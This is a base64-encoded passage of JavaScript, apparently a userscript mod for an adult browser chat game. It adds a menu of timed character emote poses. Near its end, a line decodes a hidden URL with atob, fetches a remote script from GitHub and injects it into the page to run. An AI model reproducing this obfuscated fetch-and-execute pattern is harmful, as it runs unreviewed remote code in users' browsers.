Mgd2hlbiB0aGUgdXNlciByZWxlYXNlcyBlaXRoZXIga2V5CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGlzQmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CiAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJzIikgewogICAgaXNTUHJlc3NlZCA9IGZhbHNlOwogIH0KfSk7CgoKLy9FbmQgb2YgUGVyc2lzdGFudCBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKLy9TdGFydCBvZiBFbW90ZSBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKLy8gRGVmaW5lIGJ1dHRvbiBVUkxzIGFuZCBuYW1lcwpjb25zdCBidXR0b25EYXRhID0gWwogIHsgbmFtZTogIlB1bGwtVXBzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDEzMAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDEwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAyNTAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAyMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewoKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDEzMAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDMwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAyNTAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA0MDAwKTsgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDEzMAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDUwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgICAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDYwMDApOyAgICAKfSB9LAogIHsgbmFtZTogIkNoZWVyIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgCiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDUwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA2MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNzAwMCk7IH0gfSwKICB7IG5hbWU6ICJKdW1waW5nIEphY2tzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgSGVpZ2h0OiAxNTAKICAgICAgICAgIH07CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB1bmRlZmluZWQ7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICBIZWlnaHQ6IDE1MAogICAgICAgICAgfTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgICB9IH0sCiAgeyBuYW1lOiAiQnVycGVlcyIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA1MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDcwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA4MDAwKTsgfSB9LAogIHsgbmFtZTogIlNsZWVwIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkV5ZXMiLCAiQ2xvc2VkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFeWVzMiIsICJDbG9zZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkVtb3RpY29uIiwgIlNsZWVwIik7CiAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgIH0gfQpdOwoKLy8gQ3JlYXRlIGJ1dHRvbiBlbGVtZW50cwpjb25zdCBidXR0b25Db250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLndpZHRoID0gIjMwMHB4IjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmhlaWdodCA9ICIzMDBweCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5sZWZ0ID0gIjUwJSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS50b3AgPSAiNTAlIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKY29uc3QgYnV0dG9uQ2lyY2xlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CmJ1dHRvbkNpcmNsZS5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS53aWR0aCA9ICIyMDBweCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5oZWlnaHQgPSAiMjAwcHgiOwpidXR0b25DaXJjbGUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwpidXR0b25DaXJjbGUuc3R5bGUub3BhY2l0eSA9ICIxIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmxlZnQgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRvcCA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkIGJsYWNrIjsKCmJ1dHRvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChidXR0b25DaXJjbGUpOwpjb25zdCBsb2dvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CmxvZ28uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CmxvZ28uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpsb2dvLnN0eWxlLndpZHRoID0gIjgwcHgiOwpsb2dvLnN0eWxlLmhlaWdodCA9ICI4MHB4IjsKbG9nby5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKbG9nby5zdHlsZS5sZWZ0ID0gIjUwJSI7CmxvZ28uc3R5bGUudG9wID0gIjUwJSI7CmxvZ28uc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNpcmNsZS5hcHBlbmRDaGlsZChsb2dvKTsKY29uc3QgYnV0dG9ucyA9IFtdOwpmb3IgKGxldCBpID0gMDsgaSA8IGJ1dHRvbkRhdGEubGVuZ3RoOyBpKyspIHsKICBjb25zdCBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICBidXR0b24uaW5uZXJUZXh0ID0gYnV0dG9uRGF0YVtpXS5uYW1lOwogIGJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgYnV0dG9uLnN0eWxlLndpZHRoID0gIjgwcHgiOwogIGJ1dHRvbi5zdHlsZS5oZWlnaHQgPSAiODBweCI7CiAgYnV0dG9uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogIGJ1dHRvbi5zdHlsZS5jb2xvciA9ICJ3aGl0ZSI7CiAgYnV0dG9uLnN0eWxlLmJveFNoYWRvdyA9ICIwIDJweCA1cHggcmdiYSgwLCAwLCAwLCAwLjMpIjsKICBidXR0b24uc3R5bGUubGVmdCA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS50b3AgPSAiNTAlIjsKICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtMTAwcHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpYDsKICBidXR0b24uc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuMnMgZWFzZS1pbi1vdXQsIHRyYW5zZm9ybSAwLjJzIGVhc2UtaW4tb3V0IjsKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBidXR0b25EYXRhW2ldLmFjdGlvbik7CiAgYnV0dG9uQ29udGFpbmVyLmFwcGVuZENoaWxkKGJ1dHRvbik7CiAgYnV0dG9ucy5wdXNoKGJ1dHRvbik7CgogIC8vIEFkZCBob3ZlciBhbmltYXRpb24KICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsICgpID0+IHsKICAgIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC05OXB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSBzY2FsZSgxLjA1KWA7CiAgfSk7CgogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgKCkgPT4gewogICAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTEwMHB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSBzY2FsZSgxKWA7CiAgfSk7Cn0KCgoKLy8gU2hvdy9oaWRlIGJ1dHRvbiBjb250YWluZXIgd2hlbiBgIGFuZCBlIGtleXMgYXJlIHByZXNzZWQKbGV0IGlzR3JhdmVLZXlEb3duID0gZmFsc2U7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCAoZXZlbnQpID0+IHsKaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgaXNHcmF2ZUtleURvd24gPSB0cnVlOwp9IGVsc2UgaWYgKGlzR3JhdmVLZXlEb3duICYmIGV2ZW50LmtleSA9PT0gImUiKSB7CiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChidXR0b25Db250YWluZXIpOwogIGJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwp9Cn0pOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIChldmVudCkgPT4gewppZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwp9Cn0pOwoKLy8gSGlkZSBidXR0b24gY29udGFpbmVyIHdoZW4gY2xpY2tlZCBvdXRzaWRlIG9mIGl0CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKGV2ZW50KSA9PiB7CmlmICghYnV0dG9uQ29udGFpbmVyLmNvbnRhaW5zKGV2ZW50LnRhcmdldCkpIHsKICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0KfSk7CgovL0VuZCBPZiBFbW90ZSBNZW51IF9fX19fX19fX19fX19fX19fXwoKLy9FTkQgT0YgQ09OVEVYVCBNRU5VIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgovL0JDTUUgTE9HTyBPbiBDaGFyYWN0ZXIKZmV0Y2goYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMEpEVFZNM0wwSkRUUzl0WVdsdUwwSkRUQzVxY3c9PScpKQoudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCi50aGVuKHRleHQgPT4gewpjb25zdCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKc2NyaXB0LmlubmVySFRNTCA9IHRleHQ7CmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKfSkKCgpmdW5jdGlvbiBzaG